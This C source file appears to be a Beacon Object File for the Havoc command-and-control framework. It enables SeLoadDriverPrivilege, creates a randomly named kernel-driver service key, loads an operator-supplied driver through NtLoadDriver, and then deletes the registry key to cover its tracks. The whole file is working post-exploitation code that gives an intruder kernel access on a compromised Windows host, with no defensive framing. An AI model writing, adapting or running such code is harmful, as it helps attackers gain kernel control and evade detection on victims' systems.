#include "beacon.h"
#include "ntdefs.h"
#include "utils.h"

static DWORD wlen_bytes(LPCWSTR s) {
    DWORD n = 0;
    while (s[n]) n++;
    return (n + 1) * sizeof(WCHAR);
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    // Arguments from Havoc:
    // arg1 (wchar): full path to .sys  e.g. C:\Temp\PoisonX.sys
    // arg2 (wchar): random driver name e.g. abcdefgh
    int    sysPathLen = 0;
    int    drvNameLen = 0;
    LPWSTR sysPath    = (LPWSTR)BeaconDataExtract(&parser, &sysPathLen);
    LPWSTR driverName = (LPWSTR)BeaconDataExtract(&parser, &drvNameLen);

    if (!sysPath || !driverName) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid arguments\n");
        return;
    }

    // ── 1. Enable SeLoadDriverPrivilege ──────────────────────
    if (!EnablePrivilege(L"SeLoadDriverPrivilege")) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Failed to enable SeLoadDriverPrivilege\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[1] SeLoadDriverPrivilege OK\n");

    // ── 2. Build registry paths under HKLM ───────────────────
    WCHAR fullRegPath[512]     = {0};
    WCHAR relativeRegPath[512] = {0};

    LPCWSTR svcPrefix    = L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\";
    LPCWSTR svcPrefixRel = L"SYSTEM\\CurrentControlSet\\Services\\";

    LPWSTR fp = fullRegPath;
    LPCWSTR t = svcPrefix;
    while (*t)  *fp++ = *t++;
    LPCWSTR dn = driverName;
    while (*dn) *fp++ = *dn++;
    *fp = L'\0';

    LPWSTR rp = relativeRegPath;
    t = svcPrefixRel;
    while (*t)  *rp++ = *t++;
    dn = driverName;
    while (*dn) *rp++ = *dn++;
    *rp = L'\0';

    // ── 3. Create registry key ────────────────────────────────
    HKEY  hKey   = NULL;
    DWORD dwDisp = 0;
    LONG  ret    = ADVAPI32$RegCreateKeyExW(
                       HKEY_LOCAL_MACHINE,
                       relativeRegPath,
                       0, NULL,
                       REG_OPTION_NON_VOLATILE,
                       KEY_WRITE,
                       NULL,
                       &hKey,
                       &dwDisp);

    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] RegCreateKeyEx failed: %ld\n", ret);
        return;
    }

    // Build ImagePath: \??\C:\path\to\driver.sys
    WCHAR   imagePath[512] = {0};
    LPCWSTR kPrefix        = L"\\??\\";
    LPWSTR  p              = imagePath;
    while (*kPrefix) *p++ = *kPrefix++;
    LPCWSTR sp             = sysPath;
    while (*sp)      *p++ = *sp++;
    *p = L'\0';

    DWORD dwType  = 1; // SERVICE_KERNEL_DRIVER
    DWORD dwStart = 3; // SERVICE_DEMAND_START
    DWORD dwError = 1; // SERVICE_ERROR_NORMAL

    ADVAPI32$RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
        (BYTE*)imagePath, wlen_bytes(imagePath));
    ADVAPI32$RegSetValueExW(hKey, L"Type", 0, REG_DWORD,
        (BYTE*)&dwType, sizeof(DWORD));
    ADVAPI32$RegSetValueExW(hKey, L"Start", 0, REG_DWORD,
        (BYTE*)&dwStart, sizeof(DWORD));
    ADVAPI32$RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD,
        (BYTE*)&dwError, sizeof(DWORD));
    ADVAPI32$RegCloseKey(hKey);
    BeaconPrintf(CALLBACK_OUTPUT, "[2] Registry key created\n");

    // ── 4. NtLoadDriver ──────────────────────────────────────
    _NtLoadDriver pNtLoadDriver = NTDLL$NtLoadDriver;

    if (!pNtLoadDriver) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtLoadDriver not resolvable\n");
        ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, relativeRegPath);
        return;
    }

    UNICODE_STRING uRegPath;
    USHORT pathLen = 0;
    while (fullRegPath[pathLen]) pathLen++;
    uRegPath.Length        = pathLen * sizeof(WCHAR);
    uRegPath.MaximumLength = uRegPath.Length + sizeof(WCHAR);
    uRegPath.Buffer        = fullRegPath;

    BeaconPrintf(CALLBACK_OUTPUT, "[3] Calling NtLoadDriver...\n");
    NTSTATUS status = pNtLoadDriver(&uRegPath);

    // ── 5. Immediate registry cleanup ────────────────────────
    // Driver is already in kernel memory — key no longer needed
    ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, relativeRegPath);
    BeaconPrintf(CALLBACK_OUTPUT, "[4] Registry key deleted\n");

    // ── 6. Result ─────────────────────────────────────────────
    if (status == STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Driver loaded. NTSTATUS: 0x%08X\n", status);
    } else if (status == STATUS_OBJECT_NAME_COLLISION) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] Driver already loaded -- continuing\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] NtLoadDriver failed. NTSTATUS: 0x%08X\n", status);
    }
}